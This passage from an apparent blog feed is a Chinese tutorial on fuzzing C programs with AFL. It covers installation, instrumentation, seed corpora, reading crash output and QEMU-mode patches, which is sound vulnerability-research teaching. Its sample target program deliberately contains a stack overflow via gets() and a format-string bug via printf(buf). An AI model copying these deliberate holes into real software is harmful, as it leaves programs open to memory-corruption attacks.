href="https://blog.csdn.net/M_N_N/article/details/78206825">160个练手CrackMe-007</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『模糊测试』使用AFL进行模糊测试</title>
      <link href="/posts/a48c.html"/>
      <url>/posts/a48c.html</url>
      
        <content type="html"><![CDATA[<h1 id="模糊测试简介"><a class="markdownIt-Anchor" href="#模糊测试简介"></a> 模糊测试简介</h1><p><strong>模糊测试（Fuzzing）</strong>，是一种挖掘软件安全漏洞、检测软件健壮性的黑盒测试方法，是目前软件测试、漏洞挖掘领域的最有效的手段之一，特别适合用于发现0Day漏洞。</p><p>其<strong>主要原理</strong>在于：</p><ul><li>通过随机或是半随机的方式生成大量数据，</li><li>将生成的数据输入给被测试的系统</li><li>检测被测系统的状态，如是否能够响应、响应是否正确等</li><li>根据被测系统的状态判断是否存在潜在的安全漏洞。</li></ul><p>目前比较成功的Fuzzer（执行模糊测试的程序）有AFL、libFuzzer、OSS-Fuzz等。</p><h1 id="afl简介"><a class="markdownIt-Anchor" href="#afl简介"></a> AFL简介</h1><p>AFL（American Fuzzy Lop）是由安全研究员Michal Zalewski开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240321161056683.png" alt="image-20240321161056683" /></p><p>调试人员为程序提供一些输入，即最左侧的testcases，AFL加载后将其放入一个队列中。对于每一次迭代，AFL首先从队列中取出一个testcase，然后对它进行修剪，去除不必要的数据以提高运行效率；再然后对输入进行变异操作，变异的模式很多，可以产生很多新的testcase。对于这些新产生的输入，将它们送到目标程序运行，若能够产生新的执行路径或者导致程序崩溃，就把它再放到队列中。在整个过程中，程序崩溃会被记录下来，它可能代表一个潜藏的漏洞。</p><h2 id="afl和libfuzzer的区别"><a class="markdownIt-Anchor" href="#afl和libfuzzer的区别"></a> AFL和LibFuzzer的区别</h2><p>LibFuzzer和AFL是目前最基本的两个模糊测试工具，而大部分的Fuzzer都是基于AFL和Libfuzzer进行进一步改进实现的，只要将这两个模糊测试工具弄明白，其它工具的安装和部署都是大同小异。</p><p>AFL和LibFuzzer的区别</p><ol><li><strong>集成方式：</strong><ul><li><strong>LibFuzzer：</strong> 通常与源代码直接集成，作为代码的一部分进行编译。它需要目标函数（即被测试的函数）的接口符合特定的格式（接受字节数组和长度作为参数）。</li><li><strong>AFL：</strong> 可以作为一个独立的工具运行，不需要对源代码进行修改。它通过插桩技术来监控程序的执行，以此来引导测试用例的生成。</li></ul></li><li><strong>测试用例生成：</strong><ul><li><strong>LibFuzzer：</strong> 使用基于覆盖率的指导来动态生成测试用例，旨在最大化代码覆盖率。</li><li><strong>AFL：</strong> 同样使用基于覆盖率的方法，但还结合了遗传算法来进化测试用例。</li></ul></li><li><strong>使用场景：</strong><ul><li><strong>LibFuzzer：</strong> 由于需要与源代码直接集成，因此更适合于对特定函数或模块进行深入的单元测试。</li><li><strong>AFL：</strong> 由于可以作为独立工具运行，因此更适合于对整个应用程序进行模糊测试，包括二进制文件。</li></ul></li></ol><p>根据不同的场景，我们可以从AFL和LibFuzzer中做出选择</p><h1 id="afl的安装"><a class="markdownIt-Anchor" href="#afl的安装"></a> AFL的安装</h1><p>从 <a src="https://github.com/google/AFL">github项目主页</a> 下载压缩包，解压后进入所在目录。</p><p>执行以下命令进行编译和安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>输入 <code>afl-fuzz</code> 测试是否编译成功</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240321170854676.png" alt="image-20240321170854676" /></p><h1 id="使用afl进行模糊测试实战"><a class="markdownIt-Anchor" href="#使用afl进行模糊测试实战"></a> 使用AFL进行模糊测试实战</h1><h2 id="前置准备"><a class="markdownIt-Anchor" href="#前置准备"></a> 前置准备</h2><ol><li><p><strong>确定项目用什么语言编写</strong></p><p>AFL主要用于C/C<ins>程序的测试，所以我们先要确定项目是否为C/C</ins>编写。（也有一些基于AFL的JAVA Fuzz程序如<a href="https://github.com/isstac/kelinci">kelinci</a>、<a href="https://github.com/Barro/java-afl">java-afl</a>等，但并不知道效果如何）</p><p>如果要批量使用AFL进行模糊测试，如何判断项目的语言：</p><ul><li>项目提供了源代码：使用 <a src="https://github.com/github-linguist/linguist">github-linguist库</a> 进行判断</li><li>项目仅提供二进制文件：</li></ul></li><li><p><strong>是否有示例程序、测试用例</strong></p><ul><li><p>如果目标有现成的示例程序，特别是一些开源的库，可以方便我们直接用示例程序调用该库，不用自己再写一个程序</p></li><li><p>如果目标已经提供测试用例，那后面构建语料库时也省事儿一点</p></li></ul></li><li><p><strong>项目规模</strong></p><p>某些程序规模很大，会被分为好几个模块，为了提高Fuzz效率，在Fuzzing前，需要定义Fuzzing部分。这里推荐一下源码阅读工具Understand，它 <code>treemap</code> 功能，可以直观地看到项目结构和规模。比如下面ImageMagick的源码中，灰框代表一个文件夹，蓝色方块代表了一个文件，其大小和颜色分别反映了行数和文件复杂度。</p></li></ol><h2 id="构建语料库"><a class="markdownIt-Anchor" href="#构建语料库"></a> 构建语料库</h2><p>AFL需要一些初始输入数据（即种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。</p><p>尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库，这一节就解决如何选择输入文件、从哪里寻找这些文件、如何精简找到的文件三个问题。</p><h2 id="标准模式有源码fuzz"><a class="markdownIt-Anchor" href="#标准模式有源码fuzz"></a> 标准模式——有源码fuzz</h2><h3 id="编译插桩"><a class="markdownIt-Anchor" href="#编译插桩"></a> 编译插桩</h3><p>首先我们可以自行用编写一个有漏洞的C语言程序 afl_test.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">AFLTest</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">16</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为16，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    AFLTest(buf);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对该源文件进行编译插桩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc afl_test.c -o afl_test</span><br></pre></td></tr></table></figure><blockquote><p>如果编译一个c<ins>的源码，使用afl-g</ins>。</p></blockquote><p>现实情况下，我们往往需要对一整个项目而不是单个的C/C<ins>文件进行fuzz，所以需要指定afl-gcc/afl-g</ins>对整个项目进行编译插桩</p><blockquote><p>命令的具体含义与作用可以参考文章xx的 <code>linux下软件的发布与安装</code> 部分内容</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure CC=<span class="string">&quot;afl-gcc&quot;</span> CXX=<span class="string">&quot;afl-g++&quot;</span> --disable-shared <span class="comment"># 指定C和C++的编译器为afl所提供的编译插桩工具</span></span><br><span class="line">make <span class="comment"># 然后再进行编译</span></span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>编译后的结果如下图，可以看到对我们留下的漏洞产生了warning，不用理会</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240322154357305.png" alt="image-20240322154357305" /></p><h3 id="建立输入和输出文件夹"><a class="markdownIt-Anchor" href="#建立输入和输出文件夹"></a> 建立输入和输出文件夹</h3><p>一般的程序接收的输入为标准输入流stdin类型或者文件类型</p><blockquote><p>stdin指的是从标准输入流（stdin，标准输入设备）中获取输入数据。</p><p>stdin通常用于从终端（命令行）或其他程序中读取输入。这种方式可以让程序<strong>接受用户的交互式输入或从其他程序输出中获取数据</strong>，而<strong>无需直接依赖于文件或其他输入源</strong>。</p></blockquote><p>对于我们这个文件afl_test.c，可以知道接收的输入类型为stdin标准输入流</p><p>建立两个文件夹：fuzz_in和fuzz_out，用来存放程序的输入和fuzz的输出结果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> fuzz_in</span><br><span class="line"><span class="built_in">mkdir</span> fuzz_out</span><br></pre></td></tr></table></figure><p>在fuzz_in文件夹下构建初始测试用例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> fuzz_in</span><br><span class="line">vim testcase</span><br></pre></td></tr></table></figure><p>在testcae文件中写入程序的输入数据，这里也可以随意输入一点文本，作为起始种子。（因为afl会根据初始种子自动变异生成更多的测试样例，所以初始种子可以随意一点）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;asdsas&quot;</span> &gt;&gt; testcase</span><br></pre></td></tr></table></figure><blockquote><p><code>afl-fuzz</code>会将<code>testcase</code>文件中的内容作为输入，通过标准输入流（stdin）传递给目标程序。</p><p>所以这里是基于stdin而并不是文件</p></blockquote><h3 id="使用-afl-fuzz-工具执行fuzz测试"><a class="markdownIt-Anchor" href="#使用-afl-fuzz-工具执行fuzz测试"></a> 使用 afl-fuzz 工具执行fuzz测试</h3><p>针对程序不同的输入类型：</p><ul><li><p>从stdin读取输入的目标程序，fuzz命令语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</span><br></pre></td></tr></table></figure><ul><li><code>-i</code>：指定测试用例所在的目录，表示从该目录中读取输入数据。</li><li><code>-o</code>：指定fuzz结果输出的目录</li><li><code>/path/to/program</code>：表示目标程序的路径</li><li><code>[...params...]</code>：表示其他可能的参数。</li></ul></li><li><p>从文件读取输入的目标程序来说，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure></li></ul><p>使用如下命令执行fuzz：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i fuzz_in -o fuzz_out ./easy_test</span><br></pre></td></tr></table></figure><p>经过一个半小时的fuzz，总共找到了4条执行路径（对应前面的程序代码），8个crash。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326111143917.png" alt="image-20240326111143917" /></p><h3 id="结束fuzz"><a class="markdownIt-Anchor" href="#结束fuzz"></a> 结束fuzz</h3><p>afl-fuzz永远不会停止，所以何时停止测试很多时候就是依靠afl-fuzz提供的状态来决定的。具体的几种方式如下所示:</p><ul><li>状态窗口的<code>cycles done</code>变为绿色;</li><li><code>afl-whatsup</code>查看afl-fuzz状态;</li><li><code>afl-stat</code>得到类似于afl-whatsup的输出结果;</li><li>定制 <code>afl-whatsup</code> -&gt;在所有代码外面加个循环就好;</li><li>用 <code>afl-plot</code> 绘制各种状态指标的直观变化趋势;</li><li><code>pythia</code>估算发现新crash和path概率。</li></ul><h3 id="结果分析"><a class="markdownIt-Anchor" href="#结果分析"></a> 结果分析</h3><h4 id="fuzz界面分析"><a class="markdownIt-Anchor" href="#fuzz界面分析"></a> fuzz界面分析</h4><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326111143917.png" alt="image-20240326111143917" /></p><p>根据上面的fuzz界面图：</p><ol><li><p><strong>process timing</strong>:</p><ul><li><p><strong><code>last new path</code></strong> : 表示自从最后一个新路径被发现以来经过的时间。这可以帮助你了解新路径发现的频率。</p><blockquote><p>如果这个字段产生了报错，如：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240329171431783.png" alt="image-20240329171431783" /></p><p>可能是因为：</p><ol><li><strong>语法错误</strong>：检查你的测试用例和目标程序，确保它们的语法正确。</li><li><strong>测试用例不足</strong>：如果你提供的初始测试用例过于简单或不足以触发新的路径，AFL 可能无法有效地探索目标程序的状态空间。</li><li><strong>代码覆盖率低</strong>：目标程序的某些部分可能难以触及，导致 AFL 无法发现新的路径。</li><li><strong>目标程序简单</strong>：如果目标程序非常简单，可能只有很少的执行路径，因此 AFL 无法发现新的路径。</li><li><strong>配置问题</strong>：检查 AFL 的配置设置，确保它们适合你的测试目标和环境。</li></ol><p>接下来要及时修正，不然继续fuzz也是徒劳（因为路径是不会改变的），可以采取以下解决方案：</p><ul><li><strong>增加测试用例</strong>：提供更多或更复杂的初始测试用例，以帮助 AFL 探索新的路径。</li><li><strong>调整 AFL 设置</strong>：调整 AFL 的参数和设置，例如增加变异率或改变变异策略，以尝试发现新的路径。</li><li><strong>优化目标程序</strong>：如果可能，修改目标程序以增加可触及的代码路径。</li><li><strong>增加测试时间</strong>：延长测试的时间，给 AFL 更多的机会发现新的路径。</li><li><strong>检查目标程序</strong>：确保目标程序没有错误，且适合模糊测试。</li></ul></blockquote></li><li><p><code>last uniq crash</code>: 表示自从最后一个独特崩溃被发现以来经过的时间。</p></li><li><p><code>last uniq hang</code>: 表示自从最后一个独特挂起被发现以来经过的时间。</p></li></ul></li><li><p><strong>overall results</strong>：</p><ul><li><p><code>cycles done</code> : 表示 AFL 完成的模糊测试循环次数。每个循环包括一系列的变异测试用例。</p><blockquote><p>如果这个字段变绿就说明后面即使继续fuzz，出现crash的几率也很低了，可以选择在这个时候停止</p></blockquote></li><li><p><code>total paths</code> : 表示 AFL 发现的总路径数量。每个路径代表程序执行中的一个独特分支或状态。</p></li><li><p><code>unique crashes</code> : 表示 AFL 发现的独特崩溃数量。这些崩溃可能是潜在漏洞的指示。</p></li><li><p><code>unique hangs</code> : 表示 AFL 发现的独特挂起数量。挂起可能是由于程序陷入无限循环或其他无响应状态造成的。</p></li></ul></li></ol><ul><li><code>cycles done</code>：</li><li><code>uniq crashes</code>：代表的是crash的数量</li></ul><ol start="3"><li><p>cycle progress</p></li><li><p>map coverage</p></li><li><p>stage progress</p><p>包括正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度。 执行速度可以直观地反映当前跑的快不快，如果速度过慢，我们可能需要进一步优化我们的Fuzzing。</p></li><li><p>findings in depth</p></li><li><p>fuzzing strategy yields</p></li><li><p>path geometry</p></li></ol><h4 id="fuzz_out分析"><a class="markdownIt-Anchor" href="#fuzz_out分析"></a> fuzz_out分析</h4><p>使用 <code>tree</code> 命令查看out文件夹的目录结构</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326162321739.png" alt="image-20240326162321739" /></p><p>目录中文件的作用：</p><ul><li><strong>queue/</strong>：存放所有具有独特执行路径的测试用例</li><li><strong>crashes/</strong>： 存放能触发待测程序崩溃的测试样本</li><li><strong>hangs/</strong> ：存发导致待测程序超时的测试样本</li><li><strong>fuzzer_stats</strong> - 文本文件，包含了fuzzer的实时统计信息，如执行速度、路径覆盖等度量指标。这个文件不断更新以反映当前的fuzzing状态。</li><li><strong>plot_data</strong> - 文本文件，包含了AFL执行过程中的统计数据。使用AFL的<code>afl-plot</code>工具处理<code>plot_data</code>文件，可以生成fuzz过程的可视化图像。</li><li><strong>fuzz_bitmap</strong> - 这是用来记录路径覆盖率的位图（coverage bitmap），非人类可读。AFL使用这个位图来跟踪程序在处理不同输入时执行的不同分支，用来帮助AFL识别新的、唯一的代码路径，以便后续生成更具有探索性的测试样本。</li></ul><p>查看 <code>fuzz_out/crashes</code> 文件夹，下面的十六进制文件即为产生崩溃的结果，</p><p>可以通过 <code>xxd</code> 命令查看对应测试用例的内容</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326161001683.png" alt="image-20240326161001683" /></p><p>可以看到产生crash的用例都符合栈溢出漏洞的情况</p><h2 id="qemu模式无源码黑盒测试"><a class="markdownIt-Anchor" href="#qemu模式无源码黑盒测试"></a> qemu模式——无源码黑盒测试</h2><p>qemu模式为在没有源代码的情况下，直接对二进制程序进行fuzzing。注意此类方法准确度较低。</p><h3 id="下载安装qemu"><a class="markdownIt-Anchor" href="#下载安装qemu"></a> 下载安装qemu</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> qemu_mode</span><br><span class="line">./build_qemu_support.sh</span><br></pre></td></tr></table></figure><p>当出现各种库的缺失报错，参考：<a src="https://blog.csdn.net/song_lee/article/details/105082092">深入分析 afl / qemu-mode(qemu模式) / afl-unicorn 编译及安装存在的问题以及相应的解决方案</a></p><p>然后修改 <code>build_qemu_support.sh</code> 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QEMU_URL=&quot;http://download.qemu-project.org/qemu-$&#123;VERSION&#125;.tar.xz&quot;</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QEMU_URL=&quot;http://download.qemu.org/qemu-$&#123;VERSION&#125;.tar.xz&quot;</span><br></pre></td></tr></table></figure><p>删除掉红框部分</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326201217863.png" alt="image-20240326201217863" /></p><p>找到下面这部分</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326201323845.png" alt="image-20240326201323845" /></p><p>删除后三行，更换为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patch -p1 &lt;../patches/syscall2.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/memfd_create.diff || exit 1</span><br></pre></td></tr></table></figure><p>添加补丁文件 <code>paches/syscall2.diff</code> ,文件内容如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- qemu-2.10.0-clean/linux-user/syscall.c2020-03-12 18:47:47.898592169 +0100</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0/linux-user/syscall.c2020-03-12 19:16:41.563074307 +0100</span></span><br><span class="line"><span class="meta">@@ -34,6 +34,7 @@</span></span><br><span class="line"> #include &lt;sys/resource.h&gt;</span><br><span class="line"> #include &lt;sys/swap.h&gt;</span><br><span class="line"> #include &lt;linux/capability.h&gt;</span><br><span class="line"><span class="addition">+#include &lt;linux/sockios.h&gt; // https://lkml.org/lkml/2019/6/3/988</span></span><br><span class="line"> #include &lt;sched.h&gt;</span><br><span class="line"> #include &lt;sys/timex.h&gt;</span><br><span class="line"> #ifdef __ia64__</span><br><span class="line"><span class="meta">@@ -116,6 +117,8 @@</span> int __clone2(int (*fn)(void *), void *ch</span><br><span class="line"> #include &quot;qemu.h&quot;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+extern unsigned int afl_forksrv_pid;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> #ifndef CLONE_IO</span><br><span class="line"> #define CLONE_IO                0x80000000      /* Clone io context */</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -256,7 +259,9 @@</span> static type name (type1 arg1,type2 arg2,</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"> #ifdef __NR_gettid</span><br><span class="line"><span class="deletion">-_syscall0(int, gettid)</span></span><br><span class="line"><span class="addition">+// taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+#define __NR_sys_gettid __NR_gettid</span></span><br><span class="line"><span class="addition">+_syscall0(int, sys_gettid)</span></span><br><span class="line"> #else</span><br><span class="line"> /* This is a replacement for the host gettid() and must return a host</span><br><span class="line">    errno. */</span><br><span class="line"><span class="meta">@@ -6219,7 +6224,8 @@</span> static void *clone_func(void *arg)</span><br><span class="line">     cpu = ENV_GET_CPU(env);</span><br><span class="line">     thread_cpu = cpu;</span><br><span class="line">     ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line"><span class="deletion">-    info-&gt;tid = gettid();</span></span><br><span class="line"><span class="addition">+    // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+    info-&gt;tid = sys_gettid();</span></span><br><span class="line">     task_settid(ts);</span><br><span class="line">     if (info-&gt;child_tidptr)</span><br><span class="line">         put_user_u32(info-&gt;tid, info-&gt;child_tidptr);</span><br><span class="line"><span class="meta">@@ -6363,9 +6369,11 @@</span> static int do_fork(CPUArchState *env, un</span><br><span class="line">                mapping.  We can&#x27;t repeat the spinlock hack used above because</span><br><span class="line">                the child process gets its own copy of the lock.  */</span><br><span class="line">             if (flags &amp; CLONE_CHILD_SETTID)</span><br><span class="line"><span class="deletion">-                put_user_u32(gettid(), child_tidptr);</span></span><br><span class="line"><span class="addition">+                // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+                put_user_u32(sys_gettid(), child_tidptr);</span></span><br><span class="line">             if (flags &amp; CLONE_PARENT_SETTID)</span><br><span class="line"><span class="deletion">-                put_user_u32(gettid(), parent_tidptr);</span></span><br><span class="line"><span class="addition">+                // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+                put_user_u32(sys_gettid(), parent_tidptr);</span></span><br><span class="line">             ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line">             if (flags &amp; CLONE_SETTLS)</span><br><span class="line">                 cpu_set_tls (env, newtls);</span><br><span class="line"><span class="meta">@@ -11402,7 +11410,8 @@</span> abi_long do_syscall(void *cpu_env, int n</span><br><span class="line">         break;</span><br><span class="line"> #endif</span><br><span class="line">     case TARGET_NR_gettid:</span><br><span class="line"><span class="deletion">-        ret = get_errno(gettid());</span></span><br><span class="line"><span class="addition">+        // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+        ret = get_errno(sys_gettid());</span></span><br><span class="line">         break;</span><br><span class="line"> #ifdef TARGET_NR_readahead</span><br><span class="line">     case TARGET_NR_readahead:</span><br></pre></td></tr></table></figure><p>添加补丁文件 <code>paches/memfd_create.diff</code> ,文件内容如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">diff -ru qemu-2.10.0-clean/util/memfd.c qemu-2.10.0/util/memfd.c</span><br><span class="line"><span class="comment">--- qemu-2.10.0-clean/util/memfd.c      2018-11-20 18:11:00.170271506 +0100</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0/util/memfd.c    2018-11-20 18:11:13.398423613 +0100</span></span><br><span class="line"><span class="meta">@@ -37,7 +37,7 @@</span></span><br><span class="line"> #include &lt;sys/syscall.h&gt;</span><br><span class="line"> #include &lt;asm/unistd.h&gt;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-static int memfd_create(const char *name, unsigned int flags)</span></span><br><span class="line"><span class="addition">+int memfd_create(const char *name, unsigned int flags)</span></span><br><span class="line"> &#123;</span><br><span class="line"> #ifdef __NR_memfd_create</span><br><span class="line">     return syscall(__NR_memfd_create, name, flags);</span><br></pre></td></tr></table></figure><p>再运行 <code>./build_qemu_support.sh</code> ，终于成功了</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326201812776.png" alt="image-20240326201812776" /></p><h3 id="使用qemu模式fuzz"><a class="markdownIt-Anchor" href="#使用qemu模式fuzz"></a> 使用qemu模式fuzz</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i fuzz-in -o fuzz-out -Q ./mips-test</span><br></pre></td></tr></table></figure><p>和有源码fuzz的区别就是加上了一个参数 <code>-Q</code></p><p>如果为文件输入记得在末尾加上 <code>@@</code></p><h1 id="报错问题"><a class="markdownIt-Anchor" href="#报错问题"></a> 报错问题</h1><p>在执行 <code>./afl-fuzz -i fuzz_in -o fuzz_out ./easy_test</code> 命令的时候，产生了如下报错：</p><p><img 